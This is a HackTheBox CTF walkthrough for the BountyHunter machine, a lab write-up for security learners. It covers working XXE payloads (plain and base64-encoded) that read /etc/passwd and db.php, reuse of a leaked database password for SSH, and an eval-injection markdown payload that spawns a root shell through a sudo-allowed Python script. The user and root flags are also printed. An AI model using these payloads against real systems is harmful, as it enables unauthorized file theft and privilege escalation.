---
title: BountyHunter HackTheBox Writeup and Walkthrough
author: Gaurav Raj
date: 2021-08-27 07:00:00 +0530
categories: [CTF, HackTHeBox]
tags: [ctf, hackthebox, htb, bountyhunter, python, privilege escalation, linux, XXE, Exploitation, thehackersbrain, hackersbrain, gauravraj, gaurav raj]
image:
    src: /assets/bountyhunter/banner.jpg
    alt: Banner Image
---

## BountyHunter
> HackTheBox Linux Machine

------

## Target IP
```bash
export IP=10.10.11.100
```

## Enumeration
### Nmap Scan
```shell-session
[elliot@archlinux] bountyhunter $ sudo nmap -sC -sV -A -v -O -oA nmap/ 10.10.11.100
# Nmap 7.91 scan initiated Fri Aug 27 11:06:42 2021 as: nmap -sC -sV -A -v -O -oA nmap/ 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.22s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
|   256 a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 (ECDSA)
|_  256 a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Bounty Hunters
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/27%OT=22%CT=1%CU=38602%PV=Y%DS=2%DC=T%G=Y%TM=61287A1
OS:2%P=x86_64-unknown-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=
OS:A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M5
OS:4DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE8
OS:8)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=
OS:)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%
OS:A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%
OS:DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=
OS:40%CD=S)

Uptime guess: 48.772 days (since Fri Jul  9 16:35:22 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   227.46 ms 10.10.14.1
2   222.17 ms 10.10.11.100

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug 27 11:07:22 2021 -- 1 IP address (1 host up) scanned in 39.81 seconds
```


Here we found 2 Open Ports, **22** (SSH) and **80** (HTTP). Here we can pentest **SSH Server** but the **HTTP** Server looks the juicy one, so let's enumerate it further.

------

## HTTP Port

### Enumeration
After visiting the site found a web page with a contact form which was not working.
![](/assets/bountyhunter/images/Pasted image 20210827124024.png)


While Analysing the source found a php page named **portal.php**
![](/assets/bountyhunter/images/Pasted image 20210827124309.png)

after viewing the **portal.php** file got another file called **log_submit.php**
![](/assets/bountyhunter/images/Pasted image 20210827124433.png)

here we found a form which can be used to **log** the **vulnerabilities**
![](/assets/bountyhunter/images/Pasted image 20210827124714.png)

the portal currently is not configured with **database**, now analysing the **requests** with **Burp**.

![](/assets/bountyhunter/images/Pasted image 20210827125033.png)
Here we can see **data** is being sent in **XML** with **Base64** encoded. So here we can try some **XML Entity** Attacks.

------

### Explotation

So here's the **XML** that is being sent.
![](/assets/bountyhunter/images/Pasted image 20210827125601.png)

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>RCE</title>
		<cwe>CWE-434</cwe>
		<cvss>9</cvss>
		<reward>100</reward>
		</bugreport>
```

So here's the payload which I used to do it.
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>CWE-434</cwe>
		<cvss>9</cvss>
		<reward>100</reward>
		</bugreport>
```

here's the final encoded payload

```
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KIDwhRE9DVFlQRSBmb28gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJmaWxlOi8vL2V0Yy9wYXNzd2QiPiBdPgoJCTxidWdyZXBvcnQ%2BCgkJPHRpdGxlPiZ4eGU7PC90aXRsZT4KCQk8Y3dlPkNXRS00MzQ8L2N3ZT4KCQk8Y3Zzcz45PC9jdnNzPgoJCTxyZXdhcmQ%2BMTAwPC9yZXdhcmQ%2BCgkJPC9idWdyZXBvcnQ%2B
```
![](/assets/bountyhunter/images/Pasted image 20210827130259.png)

here we got the requested file (**/etc/passwd**).
![](/assets/bountyhunter/images/Pasted image 20210827130455.png)

while enumerating the site I previously found a file named **db.php**, let's get that.

Payload
```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=db.php"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>CWE-434</cwe>
		<cvss>9</cvss>
		<reward>100</reward>
		</bugreport>
```

Encoded Payload
```
PD94bWwgIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IklTTy04ODU5LTEiPz4KIDwhRE9DVFlQRSBmb28gWyA8IUVOVElUWSB4eGUgU1lTVEVNICJwaHA6Ly9maWx0ZXIvY29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPWRiLnBocCI%2BIF0%2BCgkJPGJ1Z3JlcG9ydD4KCQk8dGl0bGU%2BJnh4ZTs8L3RpdGxlPgoJCTxjd2U%2BQ1dFLTQzNDwvY3dlPgoJCTxjdnNzPjk8L2N2c3M%2BCgkJPHJld2FyZD4xMDA8L3Jld2FyZD4KCQk8L2J1Z3JlcG9ydD4%3D
```

Now let's forward the request with our payload injected.
![](/assets/bountyhunter/images/Pasted image 20210827130954.png)

and here we got the data of the file.
![](/assets/bountyhunter/images/Pasted image 20210827131050.png)
```shell-session
[elliot@archlinux] bountyhunter git:(main) ✗$ vim db_encoded.php
[elliot@archlinux] bountyhunter git:(main) ✗$ cat db_encoded.php | base64 -d | tee db_decoded.php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
[elliot@archlinux] bountyhunter git:(main) ✗$
```

-----

## Getting Access

and here we got some credentials, let's try to login to the **SSH** with provided credentials. 
I tried using the credentials with users **bounty** and **admin** but that didn't worked.
So looking at the **/etc/passwd** file we found a user named **development**. let's 
trying the credential against him worked and we got a **SSH** Session.

![](/assets/bountyhunter/images/Pasted image 20210827132811.png)

```shell-session
[elliot@archlinux] bountyhunter git:(main) ✗$ ssh development@10.10.11.100
The authenticity of host '10.10.11.100 (10.10.11.100)' can't be established.
ED25519 key fingerprint is SHA256:p7RCN4B2AtB69d0vE1LTmg0lRRlnsR1fxArJ+KNoNFQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.100' (ED25519) to the list of known hosts.
development@10.10.11.100's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 27 Aug 2021 08:08:21 AM UTC

  System load:  0.0               Processes:             219
  Usage of /:   23.8% of 6.83GB   Users logged in:       1
  Memory usage: 13%               IPv4 address for eth0: 10.10.11.100
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Aug 27 08:07:32 2021 from 10.10.14.19
development@bountyhunter:~$
```

here we got the **user flag**
```shell-session
development@bountyhunter:~$ cat user.txt
eb36260016bc05f0c33dcc2b58823461
```

------

## Privilege Escalation
Looking at the **sudo** capibility of our user we got this

![](/assets/bountyhunter/images/Pasted image 20210827134537.png)

```shell-session
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

So we can run a python file named **ticketValidator.py** with **sudo**, which can be abused to gain root shell.

**ticketValidator.py** file
```python
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

So what the script does is It checks the **.md** filetype and for the **title** and the **subtitle** of the **markdown** file if the checks pass, it will execute our code.

So here's our payload with filename **privesc.md**
```markdown
# Skytrain Inc
## Ticket to root
__Ticket Code:__
**102+10 == 112 and __import__('os').system('/bin/bash') == True
```
![](/assets/bountyhunter/images/Pasted image 20210827134323.png)

Now let's run the command.
```shell-session
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/home/development/privesc.md
Destination: root
root@bountyhunter:/home/development# 
```

And here we got the **Root Shell**.

-----

### Root Flag
```
root@bountyhunter:/home/development# cat /root/root.txt
178180a9c12766e25351087423eed974
```

And here we successfully completed the Machine.

That's it for now, Thanks for Reading :)
-------

